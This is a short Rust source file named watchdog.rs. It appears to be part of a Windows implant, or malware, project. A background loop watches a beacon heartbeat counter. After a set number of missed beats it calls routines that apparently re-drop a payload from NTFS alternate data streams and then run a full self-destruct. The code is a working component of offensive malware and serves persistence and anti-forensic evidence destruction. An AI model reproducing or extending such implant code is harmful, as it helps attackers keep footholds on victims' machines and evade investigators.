//! watchdog.rs — heartbeat monitor
//!
//! A background thread checks a shared atomic every N seconds.
//! If the beacon misses too many beats the implant calls full_destruct().

#![allow(dead_code)]

use core::sync::atomic::{AtomicU32, Ordering};
use winapi::um::synchapi::Sleep;

static HEARTBEAT: AtomicU32 = AtomicU32::new(0);

pub fn kick() {
    HEARTBEAT.fetch_add(1, Ordering::Relaxed);
}

/// Spawn the watchdog loop. `interval_ms` is how often to sample;
/// `max_misses` is how many consecutive flat heartbeats trigger destruct.
pub unsafe fn start(interval_ms: u32, max_misses: u32) {
    let mut last   = HEARTBEAT.load(Ordering::Relaxed);
    let mut misses = 0u32;
    loop {
        Sleep(interval_ms);
        let now = HEARTBEAT.load(Ordering::Relaxed);
        if now == last {
            misses += 1;
            if misses >= max_misses {
                crate::resurrect::drop_from_ads();
                crate::selfdestruct::full_destruct();
                // full_destruct() does not return
            }
        } else {
            misses = 0;
        }
        last = now;
    }
}
